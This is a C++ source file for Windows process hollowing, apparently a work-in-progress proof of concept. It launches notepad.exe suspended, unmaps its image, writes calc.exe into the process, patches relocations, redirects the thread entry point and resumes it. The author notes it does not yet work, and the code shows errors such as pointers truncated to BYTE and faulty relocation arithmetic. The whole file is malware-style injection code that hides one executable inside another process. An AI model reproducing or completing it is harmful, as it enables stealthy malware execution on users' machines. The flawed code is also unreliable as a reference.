/*
1. create process suspended -> CreateProcesA
2. unmap the target process -> UnMapViewOfSection
3. allocate memory for the payload -> VirtualAllocEx
4. write the payload in the allocated memory -> WriteProcessemory
5. set the entry point to the entry point of the payload -> SetThreadContext
6. resume execution  -> ResumeThread



program not working properly yet
*/

#include <iostream>
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (* _NtUnmapViewOfSection)(
HANDLE ProcessHandle,
PVOID  BaseAddress
) ;

typedef NTSTATUS (* _NtQueryInformationProcess)(
	HANDLE           ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID            ProcessInformation,
	 ULONG            ProcessInformationLength,
	 PULONG           ReturnLength
);


typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;




int main()
{
	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pProcessInformation = new PROCESS_INFORMATION();

	BOOL Process = CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL,pStartupInfo,pProcessInformation );
	if (!Process) {
		return 0;
	}

	HMODULE hModule = GetModuleHandleA("ntdll.dll");
	if (!hModule) {
		return 0;
	}
	_NtUnmapViewOfSection __NtUnmapViewOfSection = (_NtUnmapViewOfSection)GetProcAddress(hModule, "NtUnmapViewOfSection");
	_NtQueryInformationProcess __NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(hModule,"NtQueryInformationProcess");
	PROCESS_BASIC_INFORMATION * PBI = new PROCESS_BASIC_INFORMATION();
	DWORD ret = 0;
	__NtQueryInformationProcess(pProcessInformation->hProcess, ProcessBasicInformation, PBI, sizeof(PROCESS_BASIC_INFORMATION), &ret);

	DWORD ImageBaseOffset = 0;
	BOOL ReadMem = ReadProcessMemory(pProcessInformation->hProcess, (LPCVOID)(PBI->PebBaseAddress->Reserved3 + 1), &ImageBaseOffset, sizeof(DWORD), NULL);
	if (ReadMem == 0) {
		return 0;
	}
	//std::cout << ImageBaseOffset ;

	__NtUnmapViewOfSection(pProcessInformation->hProcess, (PVOID)ImageBaseOffset);

	HANDLE hFile = CreateFileA("C:\\Windows\\SysWOW64\\calc.exe", GENERIC_READ, 0, NULL, OPEN_ALWAYS, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE ) {

		return 0;
	}

	LPVOID srcFile = new BYTE[GetFileSize(hFile, 0)]; 

	BOOL ReadState = ReadFile(hFile, srcFile, GetFileSize(hFile, 0), NULL, NULL);

	if (!ReadState) {
		

		std::cout <<ReadState;
		return 0;
	}



	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)srcFile;
	PIMAGE_NT_HEADERS32 pNtHeader = (PIMAGE_NT_HEADERS32) ((BYTE)srcFile + pDosHeader->e_lfanew) ;

	DWORD SizeOfImage = pNtHeader->OptionalHeader.SizeOfImage;

	if (VirtualAllocEx(pProcessInformation->hProcess, (LPVOID)ImageBaseOffset, SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) == 0) {
		return 0;
	}


	DWORD delta = ImageBaseOffset - pNtHeader->OptionalHeader.ImageBase;
	if (delta != 0) {
		delta = pNtHeader->OptionalHeader.ImageBase - ImageBaseOffset;
	}
	pNtHeader->OptionalHeader.ImageBase = ImageBaseOffset;


	if (WriteProcessMemory(pProcessInformation->hProcess, (LPVOID)ImageBaseOffset, srcFile, pNtHeader->OptionalHeader.SizeOfHeaders, NULL) == 0) {
		return 0;
	}

	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((BYTE)srcFile + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
	//std::cout << pSectionHeader->Name;

	DWORD nSections = pNtHeader->FileHeader.NumberOfSections;
	for (int i = 0; i < nSections; i++) {
		WriteProcessMemory(pProcessInformation->hProcess, (LPVOID)(ImageBaseOffset + pSectionHeader->VirtualAddress),(LPCVOID)((BYTE)srcFile + pSectionHeader->PointerToRawData), (SIZE_T)pSectionHeader->SizeOfRawData, NULL);
		
		if (delta != 0 && strcmp( reinterpret_cast< const char * > (pSectionHeader->Name), ".reloc") == 0) {
			//Relocation 

			PBASE_RELOCATION_BLOCK pCurrentBlock = (PBASE_RELOCATION_BLOCK)((BYTE)srcFile + pSectionHeader->PointerToRawData);
			PIMAGE_DATA_DIRECTORY relocTable = (PIMAGE_DATA_DIRECTORY)(IMAGE_DIRECTORY_ENTRY_BASERELOC + pNtHeader->OptionalHeader.DataDirectory);

			DWORD sizeBlockTraverse = 0;
			while (sizeBlockTraverse < relocTable->Size)
			{

				DWORD nOfEntries = (pCurrentBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);

				PBASE_RELOCATION_ENTRY currentEntry = (PBASE_RELOCATION_ENTRY)(pCurrentBlock + 1); 


				for (int i = 0; i < nOfEntries; i++) {

					if (currentEntry->Type == 0) {
						currentEntry++;
						continue;
					}
					DWORD buff = 0;
					SIZE_T nBytes = 0;
						ReadProcessMemory(pProcessInformation->hProcess, (LPCVOID)(ImageBaseOffset + pCurrentBlock->PageAddress + currentEntry->Offset), &buff, sizeof(DWORD), & nBytes);
						buff += delta;

						WriteProcessMemory(pProcessInformation->hProcess,(LPVOID) (ImageBaseOffset + pCurrentBlock->PageAddress + currentEntry->Offset), &buff, sizeof(DWORD), &nBytes);

					currentEntry++;

				}


				sizeBlockTraverse += pCurrentBlock->BlockSize;
				pCurrentBlock = PBASE_RELOCATION_BLOCK ( (pCurrentBlock) + pCurrentBlock->BlockSize); 


			}

		}

		
		pSectionHeader++;

	}

	LPCONTEXT cThread = new CONTEXT();
	cThread->ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(pProcessInformation->hThread, cThread);

	cThread->Rax = (ImageBaseOffset + pNtHeader->OptionalHeader.AddressOfEntryPoint);

	if (SetThreadContext(pProcessInformation->hThread, cThread) == 0) {
		return 0;
	}

	ResumeThread(pProcessInformation->hThread);

	return 1;
}
